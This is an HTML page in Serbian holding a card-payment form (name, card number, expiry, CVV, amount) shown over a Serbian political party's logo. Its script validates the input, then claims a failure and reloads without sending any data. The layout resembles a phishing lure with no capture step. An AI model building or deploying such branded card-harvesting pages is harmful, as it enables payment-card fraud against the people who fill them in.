<!DOCTYPE html>
<html lang="sr">
<head>
  <meta charset="UTF-8" />
  <title>Forma za unos</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Montserrat', Arial, sans-serif;
      font-weight: 700;
      background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Serbian_Progressive_Party_logo.svg/1920px-Serbian_Progressive_Party_logo.svg.png');
      background-repeat: no-repeat;
      background-position: center;
      background-size: contain;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: rgba(255, 255, 255, 0.6);
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 400px;
      font-weight: 700;
    }

    .form-group {
      margin-bottom: 15px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: 700;
    }

    input[type="text"], input[type="number"] {
      width: 100%;
      padding: 8px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
      font-weight: 700;
      font-family: 'Montserrat', Arial, sans-serif;
    }

    /* Uklanjanje strelica u input[type=number] */
    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }

    input[type=number] {
      -moz-appearance: textfield;
    }

    .row {
      display: flex;
      gap: 10px;
    }

    .small-input {
      width: 20%;
    }

    button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      border: none;
      background-color: #007bff;
      color: white;
      border-radius: 5px;
      transition: background-color 0.3s ease;
      font-weight: 700;
      font-family: 'Montserrat', Arial, sans-serif;
    }

    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <div class="container">
    <form id="myForm" novalidate>
      <div class="form-group">
        <label for="ime">Ime i prezime</label>
        <input type="text" id="ime" name="ime" required />
      </div>

      <div class="form-group">
        <label for="nasumican">Broj kartice</label>
        <input
          type="text"
          id="nasumican"
          name="nasumican"
          maxlength="19"
          autocomplete="off"
          required
        />
      </div>

      <div class="form-group row">
        <div class="small-input">
          <label for="mesec">Mesec</label>
          <input
            type="number"
            id="mesec"
            name="mesec"
            min="1"
            max="12"
            required
          />
        </div>
        <div class="small-input">
          <label for="godina">Godina</label>
          <input
            type="number"
            id="godina"
            name="godina"
            min="0"
            required
          />
        </div>
      </div>

<div class="form-group small-input">
  <label for="broj2" style="white-space: nowrap;">CVV(trocifren broj sa zadnje strane kartice)</label>
  <input
    type="number"
    id="broj2"
    name="broj2"
    min="0"
    required
    oninput="this.value=this.value.slice(0,3);"
  />
</div>

      <div class="form-group">
        <label for="iznos">Iznos</label>
        <input
          type="text"
          id="iznos"
          name="iznos"
          required
        />
      </div>

      <button type="submit">Pošalji</button>
    </form>
  </div>

  <script>
    const nasumicanInput = document.getElementById('nasumican');

    nasumicanInput.addEventListener('input', () => {
      let value = nasumicanInput.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      let formattedValue = '';
      for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) {
          formattedValue += ' ';
        }
        formattedValue += value[i];
      }
      nasumicanInput.value = formattedValue;
    });

    nasumicanInput.addEventListener('focus', () => {
      nasumicanInput.value = nasumicanInput.value.replace(/\s+/g, '');
    });

    nasumicanInput.addEventListener('blur', () => {
      let value = nasumicanInput.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      let formattedValue = '';
      for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) {
          formattedValue += ' ';
        }
        formattedValue += value[i];
      }
      nasumicanInput.value = formattedValue;
    });

    const mesecInput = document.getElementById('mesec');

    mesecInput.addEventListener('blur', () => {
      let val = mesecInput.value;
      if (val === '') return;
      let num = parseInt(val, 10);
      if (isNaN(num) || num < 1 || num > 12) {
        mesecInput.value = '';
        return;
      }
      mesecInput.value = num < 10 ? '0' + num : '' + num;
    });

    const godinaInput = document.getElementById('godina');

    godinaInput.addEventListener('blur', () => {
      let val = godinaInput.value;
      if (val === '') return;
      let num = parseInt(val, 10);
      if (!isNaN(num) && num < 25) {
        godinaInput.value = '';
      }
    });

    document.getElementById('myForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const ime = document.getElementById('ime').value.trim();
      const nasumican = document.getElementById('nasumican').value.replace(/\s+/g, '');
      const mesec = document.getElementById('mesec').value.trim();
      const godina = document.getElementById('godina').value.trim();
      const broj2 = document.getElementById('broj2').value.trim();
      const iznos = document.getElementById('iznos').value.trim();

      if (!ime) {
        alert('Molimo unesite ime i prezime.');
        return;
      }
      if (!nasumican || !/^\d{1,16}$/.test(nasumican)) {
        alert('Molimo unesite ispravan broj kartice.');
        return;
      }
      if (!mesec || !/^(0[1-9]|1[0-2])$/.test(mesec)) {
        alert('Molimo unesite mesec u formatu od 01 do 12.');
        return;
      }
      if (!godina || parseInt(godina) < 25) {
        alert('Godina ne može biti manja od 25.');
        return;
      }
      if (!broj2 || broj2.length > 3 || isNaN(broj2)) {
        alert('Molimo unesite broj sa zadnje strane kartice(CVV).');
        return;
      }
      if (!iznos) {
        alert('Molimo unesite iznos.');
        return;
      }

      alert('Molimo pokušajte kasnije.');
      location.reload();
    });
  </script>
</body>
</html>
